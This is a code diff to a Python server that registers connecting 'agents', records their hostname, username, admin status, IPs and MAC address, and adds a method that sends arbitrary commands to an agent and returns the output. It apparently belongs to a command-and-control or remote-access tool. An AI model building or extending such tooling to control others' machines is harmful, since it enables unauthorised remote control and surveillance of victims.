@@ -7,7 +7,7 @@ import os
 import logging
 from typing import Type
 from db.engine import Engine
-from db.models import agents_table, agent_id, latest_ping_time
+from db.models import agents_table, agent_id
 from db.query import Insert, Select, Update
 from logs import logger
 
@@ -25,6 +25,7 @@ class Server:
         self.timeout_secs: int = 160
         self.check_offline_agents_time_secs: int = 60
         self.max_connections: int = 5
+        self.connected_agents: dict[str, socket.socket] = {}
 
     def start(self, host: str = "0.0.0.0", port: int = 8080) -> None:
         """Binds the server to the given address, and listens for new connections."""
@@ -64,6 +65,7 @@ class Server:
             self.socket = None
 
         self.is_running = False
+        self.connected_agents = {}
         logger.info("Server stopped.")
 
     def accept_new_connections(self) -> None:
@@ -95,30 +97,28 @@ class Server:
 
         try:
             raw_data: str = client_socket.recv(self.buffer_size).decode()
-            connection_details: dict = json.loads(raw_data)
+            initial_connection_info: dict = json.loads(raw_data)
 
-            agent_uuid = connection_details.get("agent_id")
+            agent_uuid = initial_connection_info.get("agent_id")
             if agent_uuid is None:
                 agent_uuid = str(uuid.uuid4())
 
             current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
             data = {
                 "agent_id": agent_uuid,
-                "name": connection_details.get("hostname", "unknown"),
+                "name": initial_connection_info.get("hostname", "unknown"),
                 "connection_time": current_time,
-                "latest_ping_time": current_time,
                 "port": str(address[1]),
-
-                "hostname": connection_details.get("hostname", "unknown"),
-                "cwd": connection_details.get("cwd", "unknown"),
-                "os_name": connection_details.get("os_name", "unknown"),
-                "os_version": connection_details.get("os_version", "unknown"),
-                "os_architecture": connection_details.get("os_architecture", "unknown"),
-                "local_ip": connection_details.get("local_ip", "unknown"),
-                "public_ip": connection_details.get("public_ip", "unknown"),
-                "mac_address": connection_details.get("mac_address", "unknown"),
-                "is_admin": connection_details.get("is_admin", "unknown"),
-                "username": connection_details.get("username", "unknown")
+                "hostname": initial_connection_info.get("hostname", "unknown"),
+                "cwd": initial_connection_info.get("cwd", "unknown"),
+                "os_name": initial_connection_info.get("os_name", "unknown"),
+                "os_version": initial_connection_info.get("os_version", "unknown"),
+                "os_architecture": initial_connection_info.get("os_architecture", "unknown"),
+                "local_ip": initial_connection_info.get("local_ip", "unknown"),
+                "public_ip": initial_connection_info.get("public_ip", "unknown"),
+                "mac_address": initial_connection_info.get("mac_address", "unknown"),
+                "is_admin": initial_connection_info.get("is_admin", "unknown"),
+                "username": initial_connection_info.get("username", "unknown")
             }
 
             # Check if agent exists in the database
@@ -140,31 +140,43 @@ class Server:
             # Send back the agent_id
             client_socket.send(json.dumps(agent_uuid).encode())
 
+            # Save to db
             db_engine_thread.commit()
 
-            self.listen_for_ping(client_socket)
+            # Store agent socket
+            self.connected_agents[agent_uuid] = client_socket
 
         except Exception as e:
             logging.log(logging.ERROR, f"Error handling client {address[0]}:{address[1]}: {e}")
         finally:
             db_engine_thread.close()
 
-    def listen_for_ping(self, client_socket: socket.socket):
+    def interact_with_agent(self, agent_uid: str, command: str) -> dict:
 
-        db_engine = self.db_engine_class()
-        db_engine.open(os.getenv("DB_PATH"))
+        logging.info(f"New command to {agent_uid}.")
+        if agent_uid not in self.connected_agents:
+            return {
+                "status": False,
+                "command_response": None,
+                "cwd": None,
+            }
 
-        try:
-            while self.is_running:
-                agent_uuid = str(json.loads(client_socket.recv(self.buffer_size).decode()))
-                if not agent_uuid:
-                    break
+        if command is None:
+            command = "test"
 
-                now = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
-                update = Update(agents_table).set({latest_ping_time: now}).where(agent_id == agent_uuid)
-                logger.info(f"Database updated agent: {agent_uuid} latest ping time.")
-                db_engine.execute(update)
-                db_engine.commit()
-                logger.info(f"Ping received from agent {agent_uuid}")
-        finally:
-            db_engine.close()
+        agent_socket = self.connected_agents[agent_uid]  # Get agent socket.
+        agent_socket.send(json.dumps(command).encode())  # Send command.
+        response = json.loads(agent_socket.recv(self.buffer_size).decode())  # Receive response.
+
+        if response:
+            return {
+                "status": True,
+                "command_response": response["command_response"],
+                "cwd": response["cwd"],
+            }
+
+        return {
+            "status": False,
+            "command_response": None,
+            "cwd": None,
+        }
